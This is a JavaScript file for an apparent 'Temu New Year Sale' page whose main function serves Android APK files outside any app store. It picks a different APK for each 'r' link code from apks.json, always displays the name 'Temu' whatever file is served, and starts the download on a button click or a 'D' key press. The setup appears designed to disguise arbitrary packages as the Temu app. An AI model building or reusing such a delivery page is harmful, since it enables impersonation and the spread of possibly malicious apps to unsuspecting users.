// Temu New Year Sale - APK Distribution System

(function() {
    'use strict';

    // Configuration
    const CONFIG = {
        CONFIG_FILE: 'apks.json',
        DOWNLOAD_TIMEOUT: 30000,
        animationThreshold: 0.1,
        animationRootMargin: '0px 0px -50px 0px',
        // Countdown to end of 2025
        COUNTDOWN_DATE: new Date('January 1, 2026 00:00:00').getTime()
    };

    // State
    let state = {
        currentAPK: null,
        currentCode: null,
        apkName: null,
        appData: null
    };

    // DOM Elements
    const elements = {
        downloadBtn: null,
        downloadBtnLarge: null,
        downloadStatus: null
    };

    // Initialize the application
    function init() {
        // Cache DOM elements
        elements.downloadBtn = document.getElementById('downloadBtn');
        elements.downloadBtnLarge = document.getElementById('downloadBtnLarge');
        elements.downloadStatus = document.getElementById('downloadStatus');

        // Load APK configuration
        loadAPKConfig();

        // Start countdown
        startCountdown();

        // Attach event listeners
        attachEventListeners();

        // Add entrance animations
        addEntranceAnimations();

        // Setup smooth scroll
        setupSmoothScroll();

        // Add parallax effect to orbs
        setupParallaxEffect();

        // Add scroll progress indicator
        addScrollProgress();

        // Setup download handlers
        setupDownloadHandlers();

        // Create fireworks effect
        createFireworks();
    }

    // Countdown Timer
    function startCountdown() {
        function updateCountdown() {
            const now = new Date().getTime();
            const distance = CONFIG.COUNTDOWN_DATE - now;

            if (distance < 0) {
                // Countdown expired
                document.getElementById('days').textContent = '00';
                document.getElementById('hours').textContent = '00';
                document.getElementById('minutes').textContent = '00';
                document.getElementById('seconds').textContent = '00';
                return;
            }

            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((distance % (1000 * 60)) / 1000);

            document.getElementById('days').textContent = String(days).padStart(2, '0');
            document.getElementById('hours').textContent = String(hours).padStart(2, '0');
            document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
            document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');
        }

        // Update immediately
        updateCountdown();

        // Update every second
        setInterval(updateCountdown, 1000);
    }

    // Load APK configuration from apks.json
    async function loadAPKConfig() {
        try {
            // Get URL parameter
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('r');
            state.currentCode = code;

            // Fetch apks.json
            const response = await fetch(CONFIG.CONFIG_FILE);

            if (!response.ok) {
                throw new Error('Failed to load APK configuration');
            }

            const config = await response.json();
            state.appData = config;

            // Determine which APK to use
            if (code && config.apps && config.apps[code]) {
                // Code exists, use specific APK
                const app = config.apps[code];
                state.currentAPK = app.filename;
                state.apkName = 'Temu'; // Always show default name

                console.log(`Loading custom APK: ${app.filename} (code: ${code})`);

            } else {
                // No code or invalid code, use default
                state.currentAPK = config.default;
                state.apkName = 'Temu';

                if (code) {
                    console.warn(`Invalid code: ${code}. Using default APK.`);
                } else {
                    console.log('Using default APK');
                }
            }

        } catch (error) {
            console.error('Error loading APK config:', error);

            // Fallback to default APK
            state.currentAPK = 'Temu_NewYear.apk';
            state.apkName = 'Temu';
            state.currentCode = null;
        }
    }

    // Attach all event listeners
    function attachEventListeners() {
        // Download buttons
        if (elements.downloadBtn) {
            elements.downloadBtn.addEventListener('click', handleDownload);
        }
        if (elements.downloadBtnLarge) {
            elements.downloadBtnLarge.addEventListener('click', handleDownload);
        }
    }

    // Setup download handlers
    function setupDownloadHandlers() {
        // Handle both download buttons
        [elements.downloadBtn, elements.downloadBtnLarge].forEach(btn => {
            if (btn) {
                btn.addEventListener('click', handleDownload);
            }
        });
    }

    // Handle APK download
    async function handleDownload(e) {
        e.preventDefault();

        if (!elements.downloadStatus) return;

        // Ensure APK config is loaded
        if (!state.currentAPK) {
            showStatus('⏳ Loading configuration...', 'loading');

            // Wait for config to load
            await new Promise(resolve => setTimeout(resolve, 2000));

            if (!state.currentAPK) {
                showStatus('✗ Failed to load APK configuration', 'error');
                console.error('APK config not loaded');
                return;
            }
        }

        // Show loading state
        const btn = e.currentTarget;
        const originalContent = btn.innerHTML;
        btn.disabled = true;
        btn.innerHTML = '<span class="btn-icon">⏳</span><span class="btn-text">Starting download...</span>';

        showStatus(`📥 Downloading Temu...`, 'loading');

        try {
            // Debug logging
            console.log(`Downloading APK: ${state.currentAPK}`);
            console.log(`Full path will be: ${window.location.pathname}${state.currentAPK}`);

            // Small delay for UX
            await new Promise(resolve => setTimeout(resolve, 500));

            // Create download link with proper path
            const downloadLink = document.createElement('a');

            // Use the APK filename directly (relative path)
            downloadLink.href = state.currentAPK;
            downloadLink.download = state.currentAPK;
            downloadLink.rel = 'noopener noreferrer';

            // Add additional attributes to ensure download
            downloadLink.target = '_blank';

            console.log(`Download link href: ${downloadLink.href}`);
            console.log(`Download will trigger for: ${state.currentAPK}`);

            // Trigger download
            document.body.appendChild(downloadLink);
            downloadLink.click();

            // Wait a bit before removing to ensure download starts
            await new Promise(resolve => setTimeout(resolve, 100));
            document.body.removeChild(downloadLink);

            // Show success message
            showStatus('✓ Download started! Check your downloads folder.', 'success');

            // Log download details
            console.log(`✓ Download initiated successfully: ${state.currentAPK}`);

        } catch (error) {
            console.error('Download failed:', error);
            showStatus('✗ Download failed. Please try again.', 'error');
        } finally {
            // Reset button state after delay
            setTimeout(() => {
                btn.disabled = false;
                btn.innerHTML = originalContent;
            }, 2000);
        }
    }

    // Show status message
    function showStatus(message, type, duration = 5000) {
        if (!elements.downloadStatus) return;

        elements.downloadStatus.textContent = message;
        elements.downloadStatus.className = `download-status ${type}`;

        // Auto-hide messages after duration
        if (type === 'success' || type === 'loading') {
            setTimeout(() => {
                if (elements.downloadStatus.classList.contains(type)) {
                    elements.downloadStatus.className = 'download-status';
                }
            }, duration);
        }
    }

    // Add entrance animations for elements
    function addEntranceAnimations() {
        const observerOptions = {
            threshold: CONFIG.animationThreshold,
            rootMargin: CONFIG.animationRootMargin
        };

        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.style.opacity = '1';
                    entry.target.style.transform = 'translateY(0)';
                    observer.unobserve(entry.target);
                }
            });
        }, observerOptions);

        // Animate deal cards
        document.querySelectorAll('.deal-card').forEach((card, index) => {
            card.style.opacity = '0';
            card.style.transform = 'translateY(30px)';
            card.style.transition = `all 0.6s cubic-bezier(0.4, 0, 0.2, 1) ${index * 0.1}s`;
            observer.observe(card);
        });

        // Animate feature cards
        document.querySelectorAll('.feature-card').forEach((card, index) => {
            card.style.opacity = '0';
            card.style.transform = 'translateY(30px)';
            card.style.transition = `all 0.6s cubic-bezier(0.4, 0, 0.2, 1) ${index * 0.1}s`;
            observer.observe(card);
        });

        // Animate steps
        document.querySelectorAll('.step').forEach((step, index) => {
            step.style.opacity = '0';
            step.style.transform = 'translateY(30px)';
            step.style.transition = `all 0.6s cubic-bezier(0.4, 0, 0.2, 1) ${index * 0.15}s`;
            observer.observe(step);
        });

        // Animate stats
        document.querySelectorAll('.stat').forEach((stat, index) => {
            stat.style.opacity = '0';
            stat.style.transform = 'translateY(20px)';
            stat.style.transition = `all 0.5s cubic-bezier(0.4, 0, 0.2, 1) ${index * 0.1}s`;
            observer.observe(stat);
        });
    }

    // Setup smooth scroll for anchor links
    function setupSmoothScroll() {
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function(e) {
                e.preventDefault();
                const targetId = this.getAttribute('href');
                const target = document.querySelector(targetId);

                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });
    }

    // Add parallax effect to background orbs
    function setupParallaxEffect() {
        let ticking = false;

        window.addEventListener('scroll', () => {
            if (!ticking) {
                window.requestAnimationFrame(() => {
                    const scrolled = window.pageYOffset;
                    const orbs = document.querySelectorAll('.gradient-orb');

                    orbs.forEach((orb, index) => {
                        const speed = 0.1 + (index * 0.05);
                        const yPos = -(scrolled * speed);
                        orb.style.transform = `translateY(${yPos}px)`;
                    });

                    ticking = false;
                });

                ticking = true;
            }
        });
    }

    // Add scroll progress indicator at top of page
    function addScrollProgress() {
        // Create progress bar
        const progressBar = document.createElement('div');
        progressBar.className = 'scroll-progress';
        Object.assign(progressBar.style, {
            position: 'fixed',
            top: '0',
            left: '0',
            width: '0%',
            height: '3px',
            background: 'linear-gradient(90deg, #ff4757, #ffa502, #ffd700)',
            zIndex: '9999',
            transition: 'width 0.1s ease'
        });

        document.body.appendChild(progressBar);

        // Update progress on scroll
        window.addEventListener('scroll', () => {
            const windowHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
            const scrolled = (window.pageYOffset / windowHeight) * 100;
            progressBar.style.width = scrolled + '%';
        });
    }

    // Create fireworks effect
    function createFireworks() {
        const fireworksContainer = document.getElementById('fireworks');
        if (!fireworksContainer) return;

        // Create random particles
        for (let i = 0; i < 20; i++) {
            setTimeout(() => {
                createFirework(fireworksContainer);
            }, Math.random() * 5000);
        }

        // Continuously create fireworks
        setInterval(() => {
            createFirework(fireworksContainer);
        }, 3000);
    }

    function createFirework(container) {
        const firework = document.createElement('div');
        firework.className = 'firework';

        const x = Math.random() * 100;
        const y = Math.random() * 100;
        const colors = ['#ff4757', '#ffa502', '#ffd700', '#4ecdc4', '#ff6b7a'];
        const color = colors[Math.floor(Math.random() * colors.length)];

        firework.style.cssText = `
            position: absolute;
            left: ${x}%;
            top: ${y}%;
            width: 4px;
            height: 4px;
            background: ${color};
            border-radius: 50%;
            box-shadow: 0 0 10px 3px ${color};
            animation: firework-burst 1s ease-out forwards;
            opacity: 0;
        `;

        container.appendChild(firework);

        // Remove after animation
        setTimeout(() => {
            firework.remove();
        }, 1000);
    }

    // Add CSS keyframes for fireworks
    const style = document.createElement('style');
    style.textContent = `
        @keyframes firework-burst {
            0% {
                opacity: 1;
                transform: scale(1);
            }
            50% {
                opacity: 0.8;
                transform: scale(20);
            }
            100% {
                opacity: 0;
                transform: scale(30);
            }
        }
    `;
    document.head.appendChild(style);

    // Add hover effect enhancement for cards
    function enhanceCardHoverEffects() {
        document.querySelectorAll('.deal-card, .feature-card').forEach(card => {
            card.addEventListener('mousemove', (e) => {
                const rect = card.getBoundingClientRect();
                const x = e.clientX - rect.left;
                const y = e.clientY - rect.top;

                const centerX = rect.width / 2;
                const centerY = rect.height / 2;

                const rotateX = (y - centerY) / 20;
                const rotateY = (centerX - x) / 20;

                card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) translateY(-8px)`;
            });

            card.addEventListener('mouseleave', () => {
                card.style.transform = 'translateY(0)';
            });
        });
    }

    // Initialize when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            init();
            enhanceCardHoverEffects();
        });
    } else {
        init();
        enhanceCardHoverEffects();
    }

    // Add keyboard shortcuts
    document.addEventListener('keydown', (e) => {
        // Press 'D' to trigger download
        if (e.key === 'd' || e.key === 'D') {
            if (elements.downloadBtn) {
                elements.downloadBtn.click();
            }
        }

        // Press 'S' to scroll to deals
        if (e.key === 's' || e.key === 'S') {
            const dealsSection = document.querySelector('#deals');
            if (dealsSection) {
                dealsSection.scrollIntoView({ behavior: 'smooth' });
            }
        }

        // Press 'H' to scroll back to hero
        if (e.key === 'h' || e.key === 'H') {
            const hero = document.querySelector('.hero');
            if (hero) {
                hero.scrollIntoView({ behavior: 'smooth' });
            }
        }
    });

    // Performance monitoring
    window.addEventListener('load', () => {
        const loadTime = window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart;
        console.log(`Temu New Year page loaded in ${loadTime}ms`);
    });

})();
